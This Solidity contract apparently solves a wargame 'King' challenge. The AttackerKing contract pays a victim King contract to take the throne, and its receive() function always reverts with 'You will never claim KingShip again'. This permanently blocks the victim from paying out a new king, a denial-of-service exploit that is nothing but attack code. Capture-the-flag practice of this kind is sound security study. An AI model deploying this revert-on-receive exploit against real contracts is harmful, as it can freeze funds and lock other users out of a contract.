// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IKing {
  function _king() external view returns (address payable);
}


contract AttackerKing{

    IKing victim;

    constructor(address _victim) payable {
        require(msg.value == 2000000000000000 wei);
        victim = IKing(_victim);
    }

    receive() external payable {
        revert("You will never claim KingShip again");
    }

    function attack() public {
        //Needs to be triggered 10 times in 10 different blocks
        (bool sent, bytes memory data) = payable(address(victim)).call{value: 2000000000000000 wei}("");
        require(sent, "Failed to send Ether");
    }
}